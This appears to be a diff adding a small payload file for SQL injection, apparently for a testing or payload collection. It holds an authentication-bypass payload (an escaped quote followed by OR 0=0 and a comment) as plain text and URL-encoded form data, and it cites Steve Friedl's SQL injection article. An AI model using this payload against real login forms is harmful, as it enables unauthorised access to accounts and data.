@@ -1,0 +1,6 @@
+username: victim
+password: \' OR  0=0 -- -
+
+username=victim&password=%5C%27%20OR%20%200%3D0%20--%20-
+
+sources: 'SQL Injection' blog by Steve Friedl, http://www.unixwiz.net/techtips/sql-injection.html
